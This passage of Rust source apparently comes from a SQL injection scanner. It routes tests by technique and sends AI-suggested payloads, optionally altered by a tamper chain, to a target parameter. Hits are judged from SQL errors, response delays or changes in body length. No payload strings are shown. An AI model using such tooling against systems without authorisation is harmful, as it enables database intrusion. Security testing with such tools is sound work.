            SqliTechnique::ErrorBased => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_error_based(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::BooleanBlind => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_boolean_blind(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::TimeBased => {
                self.test_time_based(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::UnionBased => {
                let baseline = self.send_request(url).await.ok()?;
                self.test_union_based(url, &param.name, &param.original_value, &baseline, tamper).await
            }
            SqliTechnique::StackedQueries => {
                self.test_stacked_queries(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::OutOfBand => {
                self.test_out_of_band(url, &param.name, &param.original_value, tamper).await
            }
            SqliTechnique::CodeInjection => {
                self.test_code_injection(url, &param.name, &param.original_value).await
            }
        }
    }

    /// Test AI-suggested payloads against the target parameter.
    /// Returns the first hit found, or None if no payload triggered a detection.
    async fn test_ai_payloads(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        suggestions: &[super::ai_advisor::AiSuggestedPayload],
        technique: SqliTechnique,
        baseline: Option<&HttpResponse>,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        use super::similarity::detect_sql_error;

        let sleep_threshold = self.config.sleep_duration_secs;

        for suggestion in suggestions {
            let raw_payload = &suggestion.payload;
            let payload = match tamper {
                Some(chain) => chain.apply(raw_payload),
                None => raw_payload.clone(),
            };

            let test_url = self.build_test_url(url, param, original_value, &payload);
            let start = std::time::Instant::now();
            let resp = match self.send_request(&test_url).await {
                Ok(r) => r,
                Err(_) => continue,
            };
            let elapsed = start.elapsed();

            match technique {
                SqliTechnique::ErrorBased => {
                    if let Some(evidence) = detect_sql_error(&resp.body) {
                        return Some(SqliTestResult {
                            parameter: param.to_string(),
                            technique: SqliTechnique::ErrorBased,
                            confidence: 0.92,
                            payload: payload.clone(),
                            evidence: format!("[AI] {}", evidence),
                            dbms_hint: None,
                        });
                    }
                }
                SqliTechnique::TimeBased => {
                    if elapsed.as_secs() >= sleep_threshold {
                        return Some(SqliTestResult {
                            parameter: param.to_string(),
                            technique: SqliTechnique::TimeBased,
                            confidence: 0.85,
                            payload: payload.clone(),
                            evidence: format!("[AI] Response delayed {}ms (threshold {}s)", elapsed.as_millis(), sleep_threshold),
                            dbms_hint: None,
                        });
                    }
                }
                SqliTechnique::BooleanBlind | SqliTechnique::UnionBased | SqliTechnique::StackedQueries => {
                    if let Some(base) = baseline {
                        let len_diff = (base.body.len() as i64 - resp.body.len() as i64).abs();
                        if len_diff > 50 && base.status == resp.status {
                            return Some(SqliTestResult {
                                parameter: param.to_string(),
                                technique,
                                confidence: 0.70,
                                payload: payload.clone(),
                                evidence: format!("[AI] Response length changed: {} → {}", base.body.len(), resp.body.len()),
                                dbms_hint: None,
                            });
                        }
                    }
                }
                SqliTechnique::OutOfBand => {} // handled separately via OOB server
                SqliTechnique::CodeInjection => {} // detected via probe, not AI payloads
            }
        }

        None
    }
}
